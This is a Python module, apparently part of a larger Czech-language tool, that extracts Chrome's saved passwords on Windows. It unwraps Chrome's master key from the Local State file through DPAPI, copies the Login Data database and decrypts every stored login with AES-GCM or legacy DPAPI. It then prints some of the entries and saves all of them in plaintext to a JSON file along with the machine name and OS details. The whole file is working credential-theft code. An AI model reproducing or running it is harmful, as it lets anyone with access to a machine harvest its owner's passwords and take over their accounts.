# modules/passexport.py
"""
Export Chrome saved passwords.
Vyuziva DPAPI master key + AES-GCM (Chrome v80+).
"""
import base64
import json
import os
import platform
import shutil
import sqlite3
import sys
from datetime import datetime

from colorama import Fore

try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None


def run():
    if platform.system() != "Windows":
        print(Fore.RED + "[!] Tato akce je jen pro Windows")
        return

    if win32crypt is None or AES is None:
        print(Fore.RED + "[!] Chybi zavislosti:")
        print(Fore.YELLOW + "    pip install pywin32 pycryptodome")
        return

    print(Fore.YELLOW + "[*] Ziskavam Chrome master key...")
    master_key = _get_master_key()
    if not master_key:
        print(Fore.RED + "[!] Master key se nepodarilo ziskat.")
        print(Fore.YELLOW + "    Zkus: 1) spustit jako admin, 2) zavrit Chrome")
        return

    print(Fore.GREEN + f"[+] Master key ziskan ({len(master_key)} B)")

    db_path = _chrome_login_data_path()
    if not db_path or not os.path.exists(db_path):
        print(Fore.RED + "[!] Chrome Login Data nenalezena")
        return

    entries = _read_chrome_logins(db_path, master_key)
    if not entries:
        print(Fore.YELLOW + "[!] Zadna ulozena hesla")
        return

    print(Fore.GREEN + f"[+] Nalezeno {len(entries)} zaznamu")

    # vypis prvnich 10
    for i, e in enumerate(entries[:10], 1):
        print(Fore.CYAN + f"\n[{i}] {e['url'][:60]}")
        print(Fore.WHITE + f"    user: {e['username']}")
        if e["decrypted"]:
            print(Fore.GREEN + f"    pass: {e['decrypted'][:30]}")
            print(Fore.YELLOW + f"    status: {e['status']}")
        else:
            print(Fore.RED + "    [ENCRYPTED]")
            print(Fore.YELLOW + f"    format: {e['format']}")
            print(Fore.YELLOW + f"    hex: {e['encrypted_hex'][:40]}")

    _save(entries, master_key)


# ---------- interni ----------

def _chrome_login_data_path():
    profile = os.environ.get("USERPROFILE", "")
    if not profile:
        return None
    return os.path.join(
        profile, "AppData", "Local", "Google", "Chrome",
        "User Data", "Default", "Login Data",
    )


def _get_master_key():
    local_state = os.path.join(
        os.environ.get("USERPROFILE", ""),
        "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State",
    )
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            state = json.load(f)
        enc = base64.b64decode(state["os_crypt"]["encrypted_key"])
        enc = enc[5:]  # strip "DPAPI" prefix
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except (OSError, KeyError, ValueError) as e:
        print(Fore.RED + f"[!] master key: {e}")
        return None


def _read_chrome_logins(db_path, master_key):
    tmp = db_path + ".mole_tmp"
    shutil.copy2(db_path, tmp)
    conn = sqlite3.connect(tmp)
    try:
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cur.fetchall()
    finally:
        conn.close()
        try:
            os.remove(tmp)
        except OSError:
            pass

    out = []
    for url, username, enc in rows:
        out.append({
            "url": url,
            "username": username,
            **_try_decrypt(enc, master_key),
        })
    return out


def _try_decrypt(enc, master_key):
    if not enc:
        return {"decrypted": "", "status": "empty",
                "encrypted_hex": "", "format": "empty"}

    hex_preview = enc.hex()[:100]
    if len(enc) > 50:
        hex_preview += "..."

    # Chrome v80+
    if enc[:3] in (b"v10", b"v11"):
        try:
            nonce, ct_tag = enc[3:15], enc[15:]
            ct, tag = ct_tag[:-16], ct_tag[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plain = cipher.decrypt_and_verify(ct, tag)
            return {"decrypted": plain.decode("utf-8"), "status": "aes_gcm",
                    "encrypted_hex": hex_preview, "format": enc[:3].decode("ascii")}
        except (ValueError, UnicodeDecodeError) as e:
            return {"decrypted": "", "status": f"aes_gcm_fail: {e}",
                    "encrypted_hex": hex_preview, "format": enc[:3].decode("ascii", "replace")}

    # stary DPAPI format
    try:
        plain = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
        return {"decrypted": plain.decode("utf-8"), "status": "dpapi",
                "encrypted_hex": hex_preview, "format": "dpapi"}
    except Exception as e:
        return {"decrypted": "", "status": f"dpapi_fail: {e}",
                "encrypted_hex": hex_preview, "format": "dpapi"}


def _save(entries, master_key):
    out_dir = os.path.join(_results_dir(), "PassExport")
    os.makedirs(out_dir, exist_ok=True)
    out_file = os.path.join(out_dir, "chrome_passwords.json")

    decrypted = sum(1 for e in entries if e["decrypted"])
    payload = {
        "metadata": {
            "extraction_date": datetime.now().isoformat(),
            "machine": platform.node(),
            "os": platform.platform(),
            "total": len(entries),
            "decrypted": decrypted,
            "master_key_preview": master_key[:16].hex(),
        },
        "passwords": entries,
    }
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=4, ensure_ascii=False)

    print(Fore.GREEN + f"\n[+] Ulozeno: {out_file}")
    print(Fore.YELLOW + f"[+] Desifrovano: {decrypted}/{len(entries)}")


def _results_dir():
    here = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(os.path.dirname(here), "results")